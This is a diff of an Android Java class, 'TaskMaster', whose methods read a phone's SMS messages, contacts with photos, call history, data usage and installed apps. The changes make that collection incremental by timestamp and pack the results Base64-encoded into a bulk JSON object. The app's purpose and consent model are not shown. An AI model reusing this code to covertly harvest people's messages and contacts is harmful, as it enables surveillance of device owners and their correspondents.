@@ -11,7 +11,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
-import android.graphics.drawable.Drawable;
+import android.graphics.drawable.BitmapDrawable;
 import android.location.Criteria;
 import android.location.Location;
 import android.location.LocationManager;
@@ -32,8 +32,6 @@ import org.json.JSONObject;
 
 import java.io.File;
 import java.io.InputStream;
-import java.io.UnsupportedEncodingException;
-import java.security.NoSuchAlgorithmException;
 import java.sql.Timestamp;
 import java.util.ArrayList;
 import java.util.Calendar;
@@ -78,6 +76,8 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                     case 3:
                         getMessages(bulkData, hashes[i]);
                         break;
+                    case 4:
+                        getMobileDataUsage(bulkData, hashes[i]);
                 }
             }
         }
@@ -159,9 +159,9 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             String[] selectionArgs = null;
             if (!hash.equals("0")) {
                 selection = "date>?";
-                selectionArgs = new String[] {hash};
+                selectionArgs = new String[]{hash};
             }
-            Cursor c = cr.query(message, projection, selection, selectionArgs,"date DESC");
+            Cursor c = cr.query(message, projection, selection, selectionArgs, "date DESC");
 
             String newHash = "";
             int totalSMS = c.getCount();
@@ -213,18 +213,22 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
     private void getContacts(JSONObject bulkData, String hash) {
         try {
             ContentResolver contentResolver = params.getContentResolver();
-            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
-                    null, null, null, null);
-
-            for (int i=0; i<cursor.getColumnCount(); i++) {
-                Log.d("COLUMN", cursor.getColumnName(i));
+            String selection = null;
+            String[] selectionArgs = null;
+            if (!hash.equals("0")) {
+                selection = "contact_last_updated_timestamp>?";
+                selectionArgs = new String[]{hash};
             }
+            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
+                    null, selection, selectionArgs,
+                    "contact_last_updated_timestamp DESC");
 
             if (cursor != null) {
                 List<String> numbers = new ArrayList<>();
                 JSONObject contacts = new JSONObject();
                 JSONArray informationArray = new JSONArray();
-                String shaString = "";
+                String newHash = "";
+                boolean first = true;
                 while (cursor.moveToNext()) {
                     String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                     if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
@@ -254,12 +258,6 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                             numbers.add(cursorInfo.getString(cursorInfo.
                                     getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                     .replace(" ", ""));
-                            shaString += cursor.getString(cursor
-                                    .getColumnIndex(ContactsContract.
-                                            Contacts.DISPLAY_NAME));
-                            shaString += cursorInfo.getString(cursorInfo.
-                                    getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            shaString += BitmapJsonHelper.getStringFromBitmap(photo);
 
                             JSONObject information = new JSONObject();
                             information.put("Name", Base64.encodeToString(
@@ -271,22 +269,29 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
                             information.put("Number", Base64.encodeToString(
                                     cursorInfo.getString(cursorInfo.
                                             getColumnIndex(ContactsContract
-                                                    .CommonDataKinds.Phone.NUMBER)).getBytes(),
+                                                    .CommonDataKinds.Phone.NUMBER))
+                                            .replace(" ", "")
+                                            .getBytes(),
                                     Base64.URL_SAFE
                             ));
                             information.put("Picture", BitmapJsonHelper
                                     .getStringFromBitmap(photo));
+
+                            if (first) {
+                                first = false;
+                                newHash = cursor.getString(cursor.getColumnIndex(ContactsContract.
+                                        Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
+                            }
+
                             informationArray.put(information);
                         }
                         cursorInfo.close();
                     }
                 }
-                contacts.put("ContactList", informationArray);
-                String theHash = SHA1Helper.SHA1(shaString);
-                if (!theHash.equals(hash)) {
-                    contacts.put("Hash",
-                            Base64.encodeToString(theHash.getBytes(),
-                                    Base64.URL_SAFE));
+
+                if (informationArray.length() != 0) {
+                    contacts.put("ContactList", informationArray);
+                    contacts.put("Hash", newHash);
                     bulkData.put("Contacts", contacts);
                 }
                 cursor.close();
@@ -299,8 +304,14 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
     private void getCallHistory(JSONObject bulkData, String hash) {
         try {
             ContentResolver contentResolver = params.getContentResolver();
+            String selection = null;
+            String[] selectionArgs = null;
+            if (!hash.equals("0")) {
+                selection = "date>?";
+                selectionArgs = new String[]{hash};
+            }
             Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
-                    null, null, null);
+                    selection, selectionArgs, "date DESC");
             if (managedCursor != null) {
                 int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                 int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
@@ -309,48 +320,41 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
 
                 JSONObject callHistory = new JSONObject();
                 JSONArray informationArray = new JSONArray();
-                String shaString = "";
-                boolean flag = false;
+                String newHash = "";
+                boolean first = true;
                 while (managedCursor.moveToNext()) {
-                    shaString += managedCursor.getString(number);
-                    Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
-                    shaString += cal.toString();
-                    shaString += managedCursor.getString(duration);
-                    String callType = managedCursor.getString(type);
-                    shaString += getCallType(callType);
-
                     JSONObject information = new JSONObject();
                     information.put("Number",
-                            Base64.encodeToString(managedCursor.getString(number).getBytes(),
+                            Base64.encodeToString(managedCursor.getString(number)
+                                            .replace(" ", "").getBytes(),
                                     Base64.URL_SAFE));
+                    Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
                     information.put("Date",
                             Base64.encodeToString(cal.toString().getBytes(),
                                     Base64.URL_SAFE));
+                    if (first) {
+                        first = false;
+                        newHash = managedCursor.getString(date);
+                    }
                     information.put("Duration",
                             Base64.encodeToString(managedCursor.getString(duration).getBytes(),
                                     Base64.URL_SAFE));
                     information.put("Direction",
-                            Base64.encodeToString(getCallType(callType).getBytes(), Base64.URL_SAFE));
+                            Base64.encodeToString(getCallType(managedCursor.getString(type))
+                                    .getBytes(), Base64.URL_SAFE));
                     informationArray.put(information);
                 }
                 managedCursor.close();
 
-                callHistory.put("Calls", informationArray);
-                String theHash = SHA1Helper.SHA1(shaString);
-                if (!theHash.equals(hash)) {
-                    callHistory.put("Hash",
-                            Base64.encodeToString(theHash.getBytes(),
-                                    Base64.URL_SAFE));
+                if (informationArray.length() != 0) {
+                    callHistory.put("Calls", informationArray);
+                    callHistory.put("Hash", newHash);
                     bulkData.put("CallHistory", callHistory);
                 }
             }
         } catch (SecurityException ex) {
             Log.d("CALL LOG EX", ex.getMessage());
         } catch (JSONException e) {
-            e.printStackTrace();
-        } catch (NoSuchAlgorithmException e) {
-            e.printStackTrace();
-        } catch (UnsupportedEncodingException e) {
             e.printStackTrace();
         }
     }
@@ -371,10 +375,27 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
         }
     }
 
-    private void getMobileDataUsage(JSONObject bulkData) {
-        long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
-        long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
-        long totalTrafic = totalTraficReceived + totalTraficTransmitted;
+    private void getMobileDataUsage(JSONObject bulkData, String hash) {
+        try {
+            long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
+            long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
+            long totalTrafic = totalTraficReceived + totalTraficTransmitted;
+
+            String total = String.valueOf(totalTrafic);
+            JSONObject totalTraficJson = new JSONObject();
+            totalTraficJson.put("Trafic", Base64.encodeToString(total.getBytes(),
+                    Base64.URL_SAFE));
+
+            String sha = SHA1Helper.SHA1(total);
+            if (!sha.equals(hash)) {
+                totalTraficJson.put("Hash", Base64.encodeToString(sha.getBytes(),
+                        Base64.URL_SAFE));
+                bulkData.put("Trafic", totalTraficJson);
+            }
+        } catch (Exception ex) {
+
+        }
+
     }
 
     private void getInstalledApps(JSONObject bulkData) {
@@ -386,13 +407,10 @@ public class TaskMaster extends AsyncTask<Context, Void, Void> {
             try {
                 app = pm.getApplicationInfo(package_name, 0);
             } catch (PackageManager.NameNotFoundException e) {
-                // TODO Auto-generated catch block
                 e.printStackTrace();
             }
             String name = (String) pm.getApplicationLabel(app);
-            Drawable icon = pm.getApplicationIcon(app);
-            int i = 0;
-            i++;
+            Bitmap icon = ((BitmapDrawable)pm.getApplicationIcon(app)).getBitmap();
         }
     }
 
